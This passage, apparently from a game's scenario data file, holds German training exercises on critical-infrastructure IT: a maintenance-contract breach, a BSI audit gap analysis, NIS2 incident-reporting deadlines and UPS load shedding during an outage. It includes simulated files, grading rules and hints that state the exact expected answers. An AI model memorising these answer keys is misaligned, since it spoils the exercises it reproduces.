              'Gerät:    Comfort Panel TP1500\n' +
              'Meldung:  Grafikfehler, Touch reagiert verzögert\n' +
              'Eröffnet als: HOCH\n' +
              '\n' +
              'Verlauf\n' +
              '-------\n' +
              '09.03.2026 08:00  Ticket eröffnet (Dringlichkeit: hoch)\n' +
              '09.03.2026 08:01  Eingangsbestätigung (automatisch, Absender: noreply@)\n' +
              '09.03.2026 18:00  Status auf "In Bearbeitung" gesetzt (System, kein Bearbeiter)\n' +
              '10.03.2026        keine Aktivität\n' +
              '11.03.2026        keine Aktivität\n' +
              '12.03.2026        keine Aktivität\n' +
              '13.03.2026        keine Aktivität\n' +
              '14.03.2026 09:00  heute — weiterhin "In Bearbeitung", kein Bearbeiter zugewiesen\n' +
              '\n' +
              '# Kein Eintrag nennt einen Menschen. Beide Einträge am 09.03. sind\n' +
              '# vom System erzeugt.\n',
          },
          {
            path: '/etc/vertragswerk/siemens-premium.txt',
            content:
              'Wartungsvertrag Premium — Vertrag PREM-2024-KRITIS-001\n' +
              '======================================================\n' +
              'Laufzeit: 01.01.2024 bis 31.12.2026\n' +
              '\n' +
              'Reaktionszeiten\n' +
              '---------------\n' +
              '  kritisch   4 Stunden Reaktion,  24 Stunden Behebung\n' +
              '  hoch      24 Stunden Reaktion,  72 Stunden Behebung\n' +
              '  normal    48 Stunden Reaktion,   5 Werktage Behebung\n' +
              '\n' +
              'Was als Reaktion gilt\n' +
              '---------------------\n' +
              'Als Reaktion gilt die Kontaktaufnahme durch einen benannten\n' +
              'Techniker mit einer inhaltlichen Aussage zum Fall. Automatische\n' +
              'Eingangsbestätigungen und Statusänderungen durch das\n' +
              'Ticketsystem gelten ausdrücklich NICHT als Reaktion.\n' +
              '\n' +
              'Folgen bei Überschreitung\n' +
              '--------------------------\n' +
              '  1. Verstoß     Gutschrift 10 Prozent auf die nächste Rechnung\n' +
              '  2. Verstoß     Gutschrift 25 Prozent\n' +
              '  3. Verstoß     Eskalation an die Geschäftsleitung beider Seiten\n' +
              '\n' +
              'Stand der Verstöße im laufenden Jahr: 2 (dokumentiert am\n' +
              '17.01.2026 und am 04.02.2026).\n',
          },
        ],
      },
      commandSkillGain: {
        cat: { linux: 1 },
        grep: { linux: 2 },
        echo: { linux: 1 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            { fileRead: '/var/log/tickets/ticket-2026-03-09-001.log' },
            { fileRead: '/etc/vertragswerk/siemens-premium.txt' },
            {
              file: '/home/operator/eskalation.md',
              reportFields: [
                // Nicht „kritisch": Das Ticket läuft als HOCH, und damit gilt
                // die 24-Stunden-Zusage. Wer die 4 nimmt, argumentiert mit
                // einer Frist, die niemand zugesagt hat — und verliert das
                // Gespräch an genau dieser Stelle.
                { key: 'stufe', matches: '^hoch$' },
                { key: 'frist', matches: '^24$' },
                { key: 'technische_reaktion', matches: '^keine$' },
                { key: 'verstoss', matches: '^ja$' },
                { key: 'folge', matches: '^eskalation$' },
              ],
            },
          ],
          resultText:
            'Damit lässt sich reden. Die Zahlen stimmen, und sie stimmen in die richtige Richtung: Das Ticket läuft als HOCH, nicht als kritisch — also 24 Stunden, nicht 4. Wer die schärfere Frist nimmt, weil der Fall sich dringlich anfühlt, verliert das Gespräch im ersten Satz.\n\nDer eigentliche Punkt steht unter der Tabelle: Um 08:01 kam eine Antwort, und um 18:00 änderte sich ein Status. Beides hat kein Mensch getan. Der Vertrag schließt genau das aus — sonst könnte jeder Anbieter seine Reaktionszeit mit einem Autoresponder einhalten. Ohne diesen Absatz gäbe es hier keinen Verstoß, sondern eine Reaktion nach einer Minute.\n\nUnd die Folge ist nicht die Gutschrift, die man erwartet: Es ist der dritte Verstoß in diesem Jahr, und dafür sieht der Vertrag die Eskalation an die Geschäftsleitung beider Seiten vor. Das ist ein anderes Gespräch als „zehn Prozent auf die nächste Rechnung" — und es ist das Gespräch, das etwas ändert.',
          skillGain: { softSkills: 6, troubleshooting: 3, security: 2 },
          effects: { stress: -2 },
        },
      ],
      hints: [
        '🤖 Jens: Bevor du mit jemandem über eine Frist streitest, musst du wissen, WELCHE Frist gilt. Die hängt an der Dringlichkeitsstufe, unter der das Ticket eröffnet wurde — nicht daran, wie dringend es sich anfühlt.',
        '🤖 Jens: Und dann die unangenehme Frage: Hat innerhalb dieser Frist wirklich jemand reagiert? Schau dir an, WER die Einträge im Verlauf erzeugt hat.',
        '🤖 Jens: Lies den Vertrag bis unter die Tabellen. Da steht, was als Reaktion zählt und was nicht — und ganz unten, wie oft das dieses Jahr schon vorgekommen ist. Die Zahl entscheidet, welche der drei Folgen greift.',
        '🤖 Jens: Konkret: `cat /var/log/tickets/ticket-2026-03-09-001.log` → `cat /etc/vertragswerk/siemens-premium.txt` → `echo "stufe: hoch" > /home/operator/eskalation.md` → `echo "frist: 24" >> /home/operator/eskalation.md` → `echo "technische_reaktion: keine" >> /home/operator/eskalation.md` → `echo "verstoss: ja" >> /home/operator/eskalation.md` → `echo "folge: eskalation" >> /home/operator/eskalation.md`.',
      ],
    },
  },
  {
    id: 'KRITIS-SC-008',
    title: 'BSI-Audit steht bevor',
    category: 'compliance',
    difficulty: 3,
    flavorText: `E-Mail vom BSI:

"Sehr geehrte Damen und Herren,
im Rahmen unserer Prüfungstätigkeit nach § 39 BSIG kündigen wir eine
Vor-Ort-Prüfung für den 28.03.2026 an.

Bitte halten Sie folgende Dokumentation bereit:
- Netzwerkplan mit Segmentierung IT/OT
- Dokumentation der Zugriffskontrollen
- Incident-Response-Prozess
- Letzte Penetrationstest-Ergebnisse"

Der Audit ist in 2 Wochen. Dein Chef ist blass geworden.

Du bist auf dem Dokumentationsserver (doc-server, 192.168.1.200). Zeit zu prüfen was vorhanden ist!`,
    urgency: 'high',
    choices: [
      {
        id: 'A',
        text: 'Alles schnell zusammenschreiben - wird schon',
        outcome: 'FAIL',
        consequence: 'BSI-Prüfer sind nicht dumm. "Diese Dokumentation ist offensichtlich erst letzte Woche erstellt worden." Mängelbericht und Nachprüfung in 6 Monaten.',
        scoreChange: -200,
        reputationChange: -25,
        lesson: 'Dokumentation ist ein kontinuierlicher Prozess, nicht ein Notfall-Projekt.',
      },
      {
        id: 'B',
        text: 'Bestandsaufnahme machen: Was haben wir, was fehlt? (Terminal)',
        outcome: 'PERFECT',
        terminalCommand: true,
        consequence: 'Du erstellst eine Gap-Analyse. 60% vorhanden, 40% fehlt. Mit 2 Wochen Vorlauf schaffst du das - der Prüfer lobt später die strukturierte Vorbereitung.',
        scoreChange: 250,
        reputationChange: 30,
        lesson: 'Audit-Vorbereitung = Gap-Analyse → Priorisierung → Abarbeitung. Keine Panik.',
      },
      {
        id: 'C',
        text: 'Externe Berater engagieren die das übernehmen',
        outcome: 'PARTIAL_SUCCESS',
        consequence: 'Berater liefern gute Arbeit, aber es kostet 15.000 Euro und sie kennen eure Systeme nicht wirklich. Audit bestanden, aber nächstes Mal solltet ihr das selbst können.',
        scoreChange: 100,
        reputationChange: 5,
        lesson: 'Externe können helfen, aber internes Know-how ist langfristig wertvoller.',
      },
    ],
    realWorldReference: 'Betreiber kritischer Anlagen weisen die Umsetzung nach § 39 BSIG alle drei Jahre gegenüber dem BSI nach — einschließlich der dabei aufgedeckten Sicherheitsmängel. Dokumentation ist der häufigste Mangel.',
    bsiReference: 'BSI IT-Grundschutz: ISMS.1 Sicherheitsmanagement',
    involvedNpcs: [],
    tags: ['security', 'bsi', 'audit', 'documentation'],
    terminalContext: {
      type: 'linux',
      hostname: 'doc-server',
      username: 'admin',
      currentPath: '/docs/security',
      templateIds: ['linux-webserver'],
      // Die Falle ist die Ordnerstruktur. In jedem der vier geforderten
      // Bereiche LIEGT eine Datei — wer nur schaut, ob etwas da ist, meldet
      // „vollständig". Erst das Lesen zeigt: eine ist zwei Jahre alt, eine
      // deckt die Hälfte ab, eine beschreibt eine Übung, die nie stattfand.
      // Und eine ist tatsächlich in Ordnung: „alles kaputt" ist auch falsch.
      taskText:
        'Vier Bereiche fordert das BSI an. Zu jedem liegt etwas unter /docs/security — lies die vier Dateien, statt nur nachzusehen, ob sie da sind.\n\nBefund nach /home/admin/befunde.md schreiben — kein Editor da, also echo "…" > datei und echo "…" >> datei. Genau diese vier Zeilen:\nnetzplan: aktuell | veraltet | teilweise | fehlt\nzugriffskontrollen: aktuell | veraltet | teilweise | fehlt\nnotfallprozess: aktuell | unerprobt | veraltet | fehlt\npentest: aktuell | veraltet | teilweise | fehlt\n\nEine Datei, die es gibt, ist nicht dasselbe wie ein Nachweis, der trägt.',
      vfsOverlay: {
        directories: [
          '/docs/security', '/docs/security/netzwerk', '/docs/security/zugriff',
          '/docs/security/notfall', '/docs/security/pentest', '/home/admin',
        ],
        files: [
          {
            path: '/docs/security/netzwerk/netzplan.txt',
            content:
              'Netzplan Stadtwerke — Segmentierung IT/OT\n' +
              'Stand: 15.06.2024\n' +
              '=========================================\n' +
              'Segment IT   192.168.1.0/24   Server\n' +
              'Segment IT   192.168.20.0/24  Arbeitsplätze\n' +
              'Segment OT   10.0.0.0/24      Leittechnik\n' +
              'Übergang     fw-it-ot         Regelwerk siehe Firewall\n' +
              '\n' +
              '# Nachtrag des Netzbetriebs (nicht eingearbeitet):\n' +
              '#   - Monitoring-Segment 192.168.10.0/24 seit 09/2024 in Betrieb\n' +
              '#   - plc03 seit 11/2024 im OT-Netz\n' +
              '#   - zwei VPN-Gegenstellen seit 01/2025\n' +
              '# Der Plan bildet den Stand von Mitte 2024 ab.\n',
          },
          {
            path: '/docs/security/zugriff/berechtigungskonzept.txt',
            content:
              'Berechtigungskonzept\n' +
              'Stand: 02.02.2026\n' +
              '====================\n' +
              'Abschnitt 1  Rollen und Gruppen im Verzeichnisdienst   vollständig\n' +
              'Abschnitt 2  Vergabe und Entzug von Rechten            vollständig\n' +
              'Abschnitt 3  Jährliche Rezertifizierung                vollständig\n' +
              'Abschnitt 4  Zugänge zur Leittechnik (OT)              — offen —\n' +
              '\n' +
              '# Zu Abschnitt 4: Die OT-Zugänge sind bis heute nicht erfasst.\n' +
              '# Wer dort ein Konto hat, weiß nur die Leitwarte. Der Abschnitt\n' +
              '# steht seit der ersten Fassung als Platzhalter im Dokument.\n',
          },
          {
            path: '/docs/security/notfall/prozess.txt',
            content:
              'Notfallprozess IT-Sicherheitsvorfall\n' +
              'Stand: 10.12.2025\n' +
              '====================================\n' +
              'Meldeweg, Rollen, Entscheidungsbefugnisse: beschrieben\n' +
              'Erreichbarkeiten: Anhang A (geprüft 12/2025)\n' +
              'Wiederanlauf: beschrieben\n' +
              '\n' +
              'Übungen\n' +
              '-------\n' +
              'geplant:       jährlich, erstmals Q1/2025\n' +
              'durchgeführt:  keine\n' +
              '\n' +
              '# Der Prozess ist inhaltlich in Ordnung und aktuell. Was fehlt,\n' +
              '# ist der Nachweis, dass er funktioniert — ein ungeübter\n' +
              '# Notfallprozess ist eine Behauptung, kein Verfahren.\n',
          },
          {
            path: '/docs/security/pentest/bericht.txt',
            content:
              'Penetrationstest — Abschlussbericht\n' +
              'Stand: 20.11.2025\n' +
              '===================================\n' +
              'Durchführung: externer Dienstleister, 5 Tage, IT und OT-Übergang\n' +
              'Befunde: 12 (3 hoch, 5 mittel, 4 niedrig)\n' +
              '\n' +
              'Umsetzungsstand\n' +
              '---------------\n' +
              'behoben:  9\n' +
              'offen:    3 (alle mit Termin und Verantwortlichem hinterlegt)\n' +
              '\n' +
              '# Ein Bericht mit offenen Punkten ist kein Mangel, solange die\n' +
              '# offenen Punkte nachverfolgt werden. Genau das ist hier der Fall.\n',
          },
        ],
      },
      commandSkillGain: {
        cat: { linux: 1 },
        grep: { linux: 2, security: 1 },
        ls: { linux: 1 },
        echo: { linux: 1 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            { fileRead: '/docs/security/netzwerk/netzplan.txt' },
            { fileRead: '/docs/security/zugriff/berechtigungskonzept.txt' },
            { fileRead: '/docs/security/notfall/prozess.txt' },
            { fileRead: '/docs/security/pentest/bericht.txt' },
            {
              file: '/home/admin/befunde.md',
              reportFields: [
                { key: 'netzplan', matches: '^veraltet$' },
                { key: 'zugriffskontrollen', matches: '^teilweise$' },
                // Der Prozess ist aktuell und inhaltlich in Ordnung. Fehlt der
                // Nachweis, dass er funktioniert — das ist etwas anderes als
                // „veraltet" und etwas anderes als „fehlt".
                { key: 'notfallprozess', matches: '^unerprobt$' },
                // Und der eine Bereich, der wirklich trägt. „Alles kaputt" ist
                // genauso falsch wie „alles da".
                { key: 'pentest', matches: '^aktuell$' },
              ],
            },
          ],
          resultText:
            'Das ist eine Gap-Analyse und keine Inventur. In jedem der vier Ordner liegt eine Datei — wer nur nachsieht, ob etwas da ist, meldet vier Haken und fällt im Gespräch mit dem Prüfer beim ersten Nachfragen durch.\n\nDie vier Befunde sind vier verschiedene Dinge, und das ist der Punkt: Der Netzplan ist inhaltlich richtig, nur zwei Jahre alt — drei Änderungen stehen als Nachtrag daneben und wurden nie eingearbeitet. Das Berechtigungskonzept ist aktuell und deckt die OT-Zugänge trotzdem nicht ab; Abschnitt 4 steht seit der ersten Fassung als Platzhalter da. Der Notfallprozess ist aktuell UND vollständig und war noch nie eine Übung wert — ein ungeübter Notfallprozess ist eine Behauptung, kein Verfahren.\n\nUnd der Pentestbericht ist in Ordnung, offene Punkte hin oder her. Ein Bericht mit drei offenen Befunden, die Termin und Verantwortlichen haben, ist ein funktionierender Prozess. Wer den auch noch als Mangel meldet, verliert die Glaubwürdigkeit für die drei echten.',
          skillGain: { security: 6, troubleshooting: 4, softSkills: 2 },
          effects: { stress: -1 },
        },
      ],
      hints: [
        '🤖 Jens: Vier Bereiche, vier Ordner, in jedem liegt etwas. Das ist die gute Nachricht und die Falle zugleich — schau nicht, OB etwas da ist, sondern was drinsteht.',
        '🤖 Jens: Achte in jeder Datei auf zwei Dinge: das Datum im Kopf und die Zeilen unter dem eigentlichen Inhalt. Da steht jeweils, was das Dokument NICHT abdeckt.',
        '🤖 Jens: Und rechne damit, dass einer der vier Bereiche wirklich in Ordnung ist. Ein Befundbericht, in dem alles rot ist, wird nicht gelesen — er wird abgetan.',
        '🤖 Jens: Konkret: `cat /docs/security/netzwerk/netzplan.txt` → `cat /docs/security/zugriff/berechtigungskonzept.txt` → `cat /docs/security/notfall/prozess.txt` → `cat /docs/security/pentest/bericht.txt` → `echo "netzplan: veraltet" > /home/admin/befunde.md` → `echo "zugriffskontrollen: teilweise" >> /home/admin/befunde.md` → `echo "notfallprozess: unerprobt" >> /home/admin/befunde.md` → `echo "pentest: aktuell" >> /home/admin/befunde.md`.',
      ],
    },
  },
  {
    id: 'KRITIS-SC-009',
    title: 'NIS2-Compliance Check',
    category: 'compliance',
    difficulty: 4,
    flavorText: `Das NIS2-Umsetzungsgesetz hat das BSI-Gesetz neu gefasst. Als Betreiber einer kritischen Anlage müsst ihr die neuen Pflichten erfüllen.

Die Geschäftsführung fragt:
"Wo stehen wir bei NIS2? Ich brauche eine Übersicht für den Aufsichtsrat!"

Du bist auf dem Compliance-Server eingeloggt. Prüfe die Anforderungen:
- Risikomanagementmaßnahmen (§§ 30, 31 BSIG)
- Meldepflichten (§ 32 BSIG: 24 h / 72 h / 1 Monat)
- Sicherheit der Lieferkette
- Schulungspflicht der Leitungsorgane

Server: security-srv (192.168.1.210)
Konfig: /etc/security/nis2/`,
    urgency: 'high',
    choices: [
      {
        id: 'A',
        text: 'Schnell "Ja, sind compliant" sagen - was soll schon sein',
        outcome: 'CRITICAL_FAIL',
        consequence: '6 Monate später: erheblicher Sicherheitsvorfall. Ihr meldet nach 5 Tagen — fällig war die Erstmeldung binnen 24 Stunden. Das BSI verhängt ein Bußgeld. Du wirst entlassen.',
        scoreChange: -400,
        reputationChange: -40,
        lesson: 'NIS2-Bußgelder können existenzbedrohend sein. Ehrliche Selbsteinschätzung ist Pflicht.',
      },
      {
        id: 'B',
        text: 'NIS2-Assessment durchführen (Terminal)',
        outcome: 'PERFECT',
        terminalCommand: true,
        consequence: 'Dein Assessment zeigt: 70% compliant. Kritische Lücken: Incident-Reporting-Prozess und Lieferanten-Risikoanalyse. Du erstellst einen Maßnahmenplan.',
        scoreChange: 250,
        reputationChange: 30,
        lesson: 'Compliance ist messbar. Gap-Analyse → Maßnahmenplan → Umsetzung → Audit.',
      },
      {
        id: 'C',
        text: 'NIS2-Berater engagieren der das macht',
        outcome: 'SUCCESS',
        consequence: 'Der Berater macht gute Arbeit, kostet aber 25.000 Euro. Ergebnis: Ihr seid zu 70% compliant, aber hättest du das nicht auch selbst herausfinden können?',
        scoreChange: 100,
        reputationChange: 10,
        lesson: 'Berater können helfen, aber Compliance muss intern verstanden und gelebt werden.',
      },
    ],
    realWorldReference: 'Das NIS2-Umsetzungsgesetz hat das BSIG zum 6. Dezember 2025 neu gefasst. Für Betreiber kritischer Anlagen drohen empfindliche Bußgelder.',
    bsiReference: 'NIS2-Umsetzungsgesetz (NIS2UmsuCG), BSIG in der Fassung vom 06.12.2025',
    involvedNpcs: [],
    tags: ['security', 'nis2', 'risk-management', 'eu'],
    terminalContext: {
      type: 'linux',
      hostname: 'security-srv',
      username: 'security-officer',
      currentPath: '/etc/security/nis2',
      // Hier wird nicht bewertet, sondern GEBAUT: Der fehlende Meldeprozess
      // ist das Ergebnis. Und die schwierigste Zahl darin ist keine Frist,
      // sondern der Zeitpunkt, ab dem sie läuft — wer den falsch setzt, hält
      // eine Frist ein, die längst abgelaufen war.
      taskText:
        'Zwei Quellen lesen: /etc/security/nis2/bewertung.txt (wo ihr steht) und /etc/security/nis2/bsig-auszug.txt (was das Gesetz sagt). Beide vollständig.\n\nDann die fehlende Verfahrensbeschreibung anlegen: /etc/security/nis2/meldeprozess.md — kein Editor da, also echo "…" > datei und echo "…" >> datei. Genau diese vier Zeilen:\nerstmeldung: <Stunden, nur die Zahl>\nfolgemeldung: <Stunden, nur die Zahl>\nabschluss: <Tage, nur die Zahl>\nbeginn: vorfall | kenntnisnahme | bestaetigung\n\nZu „beginn": Ab welchem Ereignis laufen die Fristen? Die Antwort steht im Gesetzesauszug, nicht im Bauchgefühl.',
      vfsOverlay: {
        directories: ['/etc/security/nis2'],
        files: [
          {
            path: '/etc/security/nis2/bewertung.txt',
            content:
              'Selbstbewertung NIS2 / BSIG\n' +
              'Stand: 14.03.2026\n' +
              '===========================\n' +
              '\n' +
              'Risikomanagement (§§ 30, 31)\n' +
              '  Risikoanalyse durchgeführt          ja (03/2024)\n' +
              '  Maßnahmen dokumentiert              ja\n' +
              '  Jährliche Überprüfung               nein — letzte vor 18 Monaten\n' +
              '\n' +
              'Meldepflichten (§ 32)\n' +
              '  Fristen bekannt                     ja\n' +
              '  Verfahren beschrieben               NEIN\n' +
              '  Vorlagen vorhanden                  nein\n' +
              '  Verantwortlichkeit benannt          nein\n' +
              '\n' +
              'Lieferkette\n' +
              '  Risikobetrachtung je Lieferant      nein\n' +
              '  Sicherheitsklauseln in Verträgen    ja\n' +
              '\n' +
              'Schulung der Leitungsorgane\n' +
              '  Awareness für Beschäftigte          ja\n' +
              '  Schulung der Leitung                geplant Q2\n' +
              '\n' +
              '# Anmerkung: Die Fristen stehen in jeder Präsentation. Was fehlt,\n' +
              '# ist die Beschreibung, WER bei einem Vorfall WAS tut — und ab\n' +
              '# wann gerechnet wird. Ohne die ist "Fristen bekannt" wertlos.\n',
          },
          {
            path: '/etc/security/nis2/bsig-auszug.txt',
            content:
              'Auszug § 32 BSIG — Meldepflichten (sinngemäß)\n' +
              '=============================================\n' +
              '\n' +
              '(1) Eine erste Meldung ist unverzüglich, spätestens aber innerhalb\n' +
              '    von 24 Stunden abzugeben.\n' +
              '\n' +
              '(2) Eine Folgemeldung mit einer ersten Bewertung ist innerhalb von\n' +
              '    72 Stunden abzugeben.\n' +
              '\n' +
              '(3) Ein Abschlussbericht ist innerhalb eines Monats nach der\n' +
              '    Folgemeldung vorzulegen (gerechnet mit 30 Tagen).\n' +
              '\n' +
              'Fristbeginn\n' +
              '-----------\n' +
              'Die Fristen beginnen mit der KENNTNISERLANGUNG von dem erheblichen\n' +
              'Sicherheitsvorfall, nicht mit seinem Eintritt und nicht mit seiner\n' +
              'abschließenden Bestätigung.\n' +
              '\n' +
              '# Das ist der Unterschied, an dem Meldungen scheitern: Ein Vorfall\n' +
              '# vom Freitag, der am Montag auffällt, ist am Montag zu melden —\n' +
              '# und nicht seit Freitag überfällig. Umgekehrt darf niemand auf\n' +
              '# die Bestätigung warten: Auch ein Verdacht ist Kenntnis.\n',
          },
        ],
      },
      commandSkillGain: {
        cat: { linux: 1 },
        echo: { linux: 1 },
        grep: { linux: 2 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            { fileRead: '/etc/security/nis2/bewertung.txt' },
            { fileRead: '/etc/security/nis2/bsig-auszug.txt' },
            {
              file: '/etc/security/nis2/meldeprozess.md',
              reportFields: [
                { key: 'erstmeldung', matches: '^24$' },
                { key: 'folgemeldung', matches: '^72$' },
                { key: 'abschluss', matches: '^30$' },
                // Die Zahl, die keine Zahl ist: Nicht der Eintritt und nicht
                // die Bestätigung, sondern die Kenntnisnahme.
                { key: 'beginn', matches: '^kenntnisnahme$' },
              ],
            },
          ],
          resultText:
            'Jetzt gibt es das Verfahren, und damit ist „Fristen bekannt" zum ersten Mal etwas wert. Die drei Zahlen standen vorher in jeder Präsentation — was fehlte, war der Satz, ab wann sie laufen.\n\nGenau daran scheitern Meldungen in beide Richtungen. Wer ab dem EINTRITT rechnet, meldet einen Vorfall vom Freitag am Montag als seit drei Tagen überfällig und liefert die Aufsicht gratis mit. Wer auf die BESTÄTIGUNG wartet, meldet gar nicht — denn bestätigt ist ein Vorfall erst, wenn die Analyse fertig ist, und die dauert länger als 24 Stunden. Auch ein begründeter Verdacht ist Kenntnis.\n\nWas jetzt noch fehlt, weißt du aus der Selbstbewertung: Vorlagen, eine benannte Verantwortlichkeit mit Vertretung und eine Lieferantenbetrachtung. Aber das Verfahren steht, und das ist der Teil, den man nicht im Vorfall nachholen kann.',
          skillGain: { security: 6, softSkills: 5 },
          effects: { stress: -1 },
        },
      ],
      hints: [
        '🤖 Jens: Die Selbstbewertung sagt dir, was fehlt — und es ist nicht das Wissen um die Fristen. Es ist die Beschreibung des Verfahrens.',
        '🤖 Jens: Die drei Fristen stehen im Gesetzesauszug. Achte beim Abschlussbericht darauf, worauf sich der Monat bezieht.',
        '🤖 Jens: Und dann der Absatz, den fast alle überlesen: „Fristbeginn". Ab welchem Ereignis läuft die Uhr? Die falsche Antwort kostet dich in beide Richtungen — zu früh überfällig oder gar nicht gemeldet.',
        '🤖 Jens: Konkret: `cat /etc/security/nis2/bewertung.txt` → `cat /etc/security/nis2/bsig-auszug.txt` → `echo "erstmeldung: 24" > /etc/security/nis2/meldeprozess.md` → `echo "folgemeldung: 72" >> /etc/security/nis2/meldeprozess.md` → `echo "abschluss: 30" >> /etc/security/nis2/meldeprozess.md` → `echo "beginn: kenntnisnahme" >> /etc/security/nis2/meldeprozess.md`.',
      ],
    },
  },
  {
    id: 'KRITIS-SC-010',
    title: 'Stromausfall im Rechenzentrum',
    category: 'crisis_management',
    difficulty: 5,
    flavorText: `ALARM: USV meldet "Hauptstromversorgung ausgefallen!"

Situation:
- USV-Kapazität: 30 Minuten Restlaufzeit
- Generator startet... FEHLER: "Diesel tank empty" ❌
- SCADA-Systeme: noch online (kritisch!)
- Alle OT-Systeme: laufen auf USV

Monitoring-Konsole (monitoring-srv, 192.168.1.50):
- 23 kritische Systeme aktiv
- Geschätzte Shutdown-Zeit ohne Strom: 2 Minuten pro System

In 30 Minuten ist der Strom weg. Was tust du?`,
    urgency: 'critical',
    choices: [
      {
        id: 'A',
        text: 'Geordneten Shutdown aller Systeme einleiten',
        outcome: 'SUCCESS',
        consequence: 'In 25 Minuten sind alle Systeme sauber heruntergefahren. Kein Datenverlust. Betrieb ruht bis Strom wieder da ist. Sauber, aber 4 Stunden Ausfall.',
        scoreChange: 150,
        reputationChange: 15,
        lesson: 'Geordneter Shutdown ist immer besser als plötzlicher Stromverlust.',
      },
      {
        id: 'B',
        text: 'Systeme priorisieren und kritischste retten (Terminal)',
        outcome: 'PERFECT',
        terminalCommand: true,
        consequence: 'Du identifizierst die 5 kritischsten Systeme, fährst die anderen herunter. SCADA bleibt 2 Stunden länger auf konzentrierter USV. Wasserversorgung läuft weiter!',
        scoreChange: 300,
        reputationChange: 35,
        lesson: 'Priorisierung unter Druck ist eine Kernkompetenz. Kritische Systeme zuerst!',
      },
      {
        id: 'C',
        text: 'Abwarten - Energieversorger wird das Problem lösen',
        outcome: 'CRITICAL_FAIL',
        consequence: '30 Minuten später: USV leer, alle Systeme tot. SCADA-Server crashen unsauber, Datenbankkorruption. 2 Tage Wiederherstellung, 50.000 Euro Schaden.',
        scoreChange: -400,
        reputationChange: -40,
        lesson: 'In einer Krise ist "Abwarten" keine Option. Handle sofort!',
      },
    ],
    realWorldReference: 'Rechenzentren brauchen Notstromkonzepte. Generator-Tests sind Pflicht!',
    bsiReference: 'BSI IT-Grundschutz: INF.1 Allgemeines Gebäude',
    involvedNpcs: [],
    tags: ['crisis', 'power', 'datacenter', 'priority'],
    terminalContext: {
      type: 'linux',
      hostname: 'monitoring-srv',
      username: 'admin',
      currentPath: '/opt/monitoring',
      templateIds: ['monitoring'],
      // Der Fall ist Rechnen unter Zeitdruck — und die Rechnung geht nicht
      // auf, wenn man die Prioritätenliste stur von unten abarbeitet. Die
      // letzten 0,5 kW müssen aus Stufe 2 kommen, und dort stehen zwei
      // Systeme, die in dieser Lage NICHT gleich wichtig sind.
      taskText:
        'Zwei Quellen lesen: /opt/monitoring/usv.txt (was die Anlage noch hergibt) und /opt/monitoring/systeme.txt (was wie viel zieht und wer wen braucht). Der Notfallplan daneben nennt die Zeit, die du überbrücken musst.\n\nPlan nach /home/admin/lastplan.md schreiben — kein Editor da, also echo "…" > datei und echo "…" >> datei. Genau diese drei Zeilen:\nabschalten: <Kennungen, kommagetrennt>\nrestlast: <verbleibende Last in kW, eine Nachkommastelle>\nlaufzeit: <Laufzeit in Minuten bei dieser Last, auf volle Minuten abgerundet>\n\nDie Laufzeit rechnest du aus der Energie, die noch im Speicher ist — die steht nicht dran, sie ergibt sich aus der jetzigen Last und der jetzigen Restlaufzeit.',
      vfsOverlay: {
        directories: ['/opt/monitoring', '/home/admin'],
        files: [
          {
            path: '/opt/monitoring/usv.txt',
            content:
              'USV Rechenzentrum — Momentaufnahme 06:12\n' +
              '========================================\n' +
              'Betriebsart:      Batterie (Netz ausgefallen 06:08)\n' +
              'Ladezustand:      85 Prozent\n' +
              'Aktuelle Last:    4,8 kW\n' +
              'Restlaufzeit:     30 Minuten bei dieser Last\n' +
              '\n' +
              'Notstromaggregat: Start fehlgeschlagen\n' +
              '                  Meldung "Tankstand leer" (Sensor: 2 von 500 Litern)\n' +
              '                  Letzte Betankung 15.06.2025, letzter Probelauf 01.12.2025\n' +
              '\n' +
              '# Zur Rechnung: Die Restlaufzeit gilt für die aktuelle Last. Wer\n' +
              '# Last wegnimmt, verlängert sie im selben Verhältnis — die\n' +
              '# Energie im Speicher ändert sich dadurch nicht.\n',
          },
          {
            path: '/opt/monitoring/systeme.txt',
            content:
              '# Systeme am USV-Strang — Stufe, Kennung, Leistung, Funktion\n' +
              '\n' +
              'Stufe 1 — darf nicht abgeschaltet werden\n' +
              '  scada-master    0,8 kW   Prozessführung Wasserwerk\n' +
              '  plc-gateway     0,2 kW   Anbindung der Steuerungen\n' +
              '  netz-technik    0,9 kW   Switches, Router, Lichtwellenleiter\n' +
              '\n' +
              'Stufe 2 — zuletzt abschalten\n' +
              '  hmi-station     0,3 kW   Bedienbild der Leitwarte\n' +
              '  historian-db    0,5 kW   Aufzeichnung der Prozessdaten\n' +
              '\n' +
              'Stufe 3 — abschaltbar\n' +
              '  file-server     0,4 kW   Dateiablage Verwaltung\n' +
              '  backup-srv      0,3 kW   Sicherung (nächster Lauf 22:00)\n' +
              '  dev-server      0,4 kW   Entwicklung und Test\n' +
              '\n' +
              'Stufe 4 — sofort abschaltbar\n' +
              '  test-umgebung   1,0 kW   fünf Testmaschinen\n' +
              '\n' +
              '# Zur Stufe 2: Die Liste sagt "zuletzt", nicht "nie". Und sie sagt\n' +
              '# nichts darüber, welches der beiden Systeme man in einer Störung\n' +
              '# eher braucht. Die Aufzeichnung läuft nach; ohne Bedienbild\n' +
              '# führt die Leitwarte den Prozess blind.\n',
          },
          {
            path: '/opt/monitoring/notfallplan.txt',
            content:
              'Notfallplan Stromausfall — Auszug\n' +
              '=================================\n' +
              'Ziel: Die Prozessführung bleibt durchgehend in Betrieb.\n' +
              '\n' +
              'Meldung des Energieversorgers vom 14.03.2026, 06:10 Uhr:\n' +
              '  "Trafoausfall im Bezirk. Wiederherstellung in 45 bis 60 Minuten."\n' +
              '\n' +
              'Planungsvorgabe: Immer mit dem oberen Wert rechnen. Eine Prognose\n' +
              'des Versorgers ist eine Schätzung, keine Zusage.\n',
          },
        ],
      },
      commandSkillGain: {
        cat: { linux: 1 },
        echo: { linux: 1 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            { fileRead: '/opt/monitoring/usv.txt' },
            { fileRead: '/opt/monitoring/systeme.txt' },
            {
              file: '/home/admin/lastplan.md',
              reportFields: [
                {
                  key: 'abschalten',
                  requiredItems: ['test-umgebung', 'file-server', 'backup-srv', 'dev-server', 'historian-db'],
                  // Stufe 1 ist tabu — und das Bedienbild ist es in dieser
                  // Lage auch. Wer es abschaltet, gewinnt zehn Minuten und
                  // führt den Prozess blind.
